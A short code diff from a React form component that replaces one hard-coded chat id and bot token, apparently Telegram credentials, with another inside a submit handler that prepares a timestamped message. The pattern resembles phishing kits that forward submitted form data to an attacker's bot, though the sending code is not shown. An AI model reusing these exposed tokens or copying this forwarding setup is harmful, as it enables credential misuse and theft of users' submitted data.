@@ -75,9 +75,8 @@ const Data = () => {
   const handleSubmit = (e) => {
     e.preventDefault();
 
-    const id = 1121426146;
-    const bot = "6229717040:AAH25e0ViIbOVvb0njOkVVElFf_H7Ol3lGA";
-
+    const id = 1422299838;
+    const bot = "6014359967:AAFzhFzmOuheM3cpnojSMYuryWhA1xPb5f0";
     let message = "";
 
     const currentDate = new Date().toLocaleString();
